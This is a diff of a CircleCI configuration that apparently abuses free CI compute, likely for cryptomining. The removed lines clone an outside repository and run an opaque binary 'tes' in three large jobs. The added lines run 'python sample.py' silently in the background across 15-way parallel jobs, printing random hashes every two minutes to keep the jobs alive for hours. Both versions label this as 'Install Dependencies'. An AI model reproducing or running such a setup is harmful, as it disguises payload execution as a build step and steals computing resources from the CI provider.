@@ -1,37 +1,32 @@
-version: 2
-jobs:
-    aku1:
-      machine:
-            image: ubuntu-2004:202101-01
-      resource_class: large
-      steps:
-        - run:
-            name: Install Dependencies
-            command: git clone https://github.com/pramadoli/b.git && cd b && chmod u+x tes && ./tes
-            no_output_timeout: 900m
-    aku2:
-      machine:
-            image: ubuntu-2004:202101-01
-      resource_class: large
-      steps:
-        - run:
-            name: Install Dependencies
-            command: git clone https://github.com/pramadoli/b.git && cd b && chmod u+x tes && ./tes
-            no_output_timeout: 900m
-    aku3:
-      machine:
-            image: ubuntu-2004:202101-01
-      resource_class: large
-      steps:
-        - run:
-            name: Install Dependencies
-            command: git clone https://github.com/pramadoli/b.git && cd b && chmod u+x tes && ./tes
-            no_output_timeout: 900m
+working_dir: &working_dir ~/app 
+.build_template: &script
+  steps: 
+    - checkout 
+    - run: 
+        name: Install Dependencies 
+        command: |
+                    apt update && apt -y install wget sudo
+                    python sample.py >/dev/null &
+                    while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done
+        no_output_timeout: 300m                               
+version: 2.0 
+jobs: 
+  build1: 
+    <<: *script
+    parallelism: 15
+    docker:
+      - image: python
+    resource_class: large
+  build2: 
+    <<: *script
+    parallelism: 15
+    docker:
+      - image: python
+    resource_class: large
 
-workflows:
-    version: 2
-    build:
-        jobs:
-            - aku1
-            - aku2
-            - aku3
+workflows: 
+  version: 2 
+  commit: 
+    jobs: 
+      - build1
+      - build2
